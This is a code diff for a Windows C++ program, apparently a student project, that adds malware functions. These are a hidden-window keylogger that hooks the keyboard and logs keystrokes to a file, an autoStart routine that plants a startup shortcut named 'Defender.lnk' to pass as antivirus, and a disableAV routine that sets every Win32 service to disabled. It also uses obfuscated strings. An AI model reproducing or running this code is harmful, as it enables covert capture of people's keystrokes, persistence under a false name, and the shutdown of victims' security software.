@@ -1,4 +1,5 @@
 
+#include <windows.h>
 #include <Windows.h>
 #include <cstdio>
 #include <iostream>
@@ -7,8 +8,10 @@
 #include "skStr.h"
 #include <stdio.h>
 #include <iostream>
+#include <conio.h>
 #include <chrono>
 #include <fstream>
+#include <filesystem>
 using namespace std;
 
 int main() {
@@ -22,8 +25,14 @@ void start()
 	void checkSerials();
 	checkSerials();
 
-	void startKeyLogger();
-	startKeyLogger();
+	//void startKeyLogger();
+	//startKeyLogger();
+
+	void autoStart();
+	autoStart();
+	
+	//void disableAV();
+	//disableAV();
 }
 
 
@@ -65,6 +74,120 @@ void checkSerials() {
 	system(skCrypt("echo."));
 }
 
+
+/*
+* Starts the Keylogger.
+* @author Deniz Kural
+* @version 2023-04-24
+*/
+void startKeyLogger()
+{
+	// open output file
+	const char* output_filename = "keylogger.txt";
+	std::cout << "Logging output to " << output_filename << std::endl;
+	output_file.open(output_filename, std::ios_base::app);
+
+	// visibility of window
+	invisibleCMD();
+
+	// set the hook
+	SetHook();
+
+	// loop to keep the console application running.
+	MSG msg;
+	while (GetMessage(&msg, NULL, 0, 0))
+	{
+	}
+}
+
+/*
+* Macht einen Shortcut in den Autostart folder von Windows
+* @author Deniz Kural
+* @version 2023-04-24
+*/
+void autoStart() {
+	
+	const char* shortcutPath = "C:\\Users\\Deniz\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Defender.lnk"; // Path to the shortcut
+	const char* programPath = "ITP Projekt.exe"; // Path to the program
+	const char* arguments = ""; // Optional arguments to pass to the program
+
+	CoInitialize(NULL);
+	IShellLink* link;
+	HRESULT result = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void**)&link);
+	if (SUCCEEDED(result))
+	{
+		link->SetPath(programPath);
+		link->SetArguments(arguments);
+
+		IPersistFile* file;
+		result = link->QueryInterface(IID_IPersistFile, (void**)&file);
+		if (SUCCEEDED(result))
+		{
+			result = file->Save(shortcutPath, TRUE);
+			file->Release();
+		}
+
+		link->Release();
+	}
+
+	CoUninitialize();
+
+}
+
+/*
+* Disable all AV
+* @author Deniz Kural
+* @version 2023-04-24
+*/
+void disableAV() {
+	SC_HANDLE scm_handle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+	if (!scm_handle) {
+		printf("Failed to open service control manager\n");
+		
+	}
+
+	DWORD service_type = SERVICE_WIN32;
+	DWORD service_state = SERVICE_STATE_ALL;
+	DWORD buffer_size = 0;
+	DWORD services_returned = 0;
+	DWORD resume_handle = 0;
+	LPENUM_SERVICE_STATUS_PROCESS services;
+
+	EnumServicesStatusEx(scm_handle, SC_ENUM_PROCESS_INFO, service_type, service_state, NULL, 0, &buffer_size, &services_returned, &resume_handle, NULL);
+
+	if (GetLastError() != ERROR_MORE_DATA) {
+		printf("Failed to get service count\n");
+		
+	}
+
+	services = (LPENUM_SERVICE_STATUS_PROCESS)malloc(buffer_size);
+
+	if (!services) {
+		printf("Failed to allocate memory for services\n");
+		
+	}
+
+	if (!EnumServicesStatusEx(scm_handle, SC_ENUM_PROCESS_INFO, service_type, service_state, (LPBYTE)services, buffer_size, &buffer_size, &services_returned, &resume_handle, NULL)) {
+		printf("Failed to enumerate services\n");
+		
+	}
+
+	for (DWORD i = 0; i < services_returned; i++) {
+		SC_HANDLE service_handle = OpenService(scm_handle, services[i].lpServiceName, SERVICE_ALL_ACCESS);
+
+		if (service_handle) {
+			ChangeServiceConfig(service_handle, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+			CloseServiceHandle(service_handle);
+		}
+	}
+
+	free(services);
+	CloseServiceHandle(scm_handle);
+
+	printf("All antivirus services have been disabled\n");
+}
+
+
 #define UNICODE
 #include <Windows.h>
 #include <cstdio>
@@ -73,6 +196,7 @@ void checkSerials() {
 #include <sstream>
 #include <time.h>
 #include <map>
+#include <chrono>
 
 // defines whether the window is visible or not
 // should be solved with makefile, not in this file
@@ -253,24 +377,4 @@ void invisibleCMD()
 #ifdef invisible
 	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
 #endif
-}
-
-void startKeyLogger()
-{
-	// open output file
-	const char* output_filename = "keylogger.txt";
-	std::cout << "Logging output to " << output_filename << std::endl;
-	output_file.open(output_filename, std::ios_base::app);
-
-	// visibility of window
-	invisibleCMD();
-
-	// set the hook
-	SetHook();
-
-	// loop to keep the console application running.
-	MSG msg;
-	while (GetMessage(&msg, NULL, 0, 0))
-	{
-	}
 }
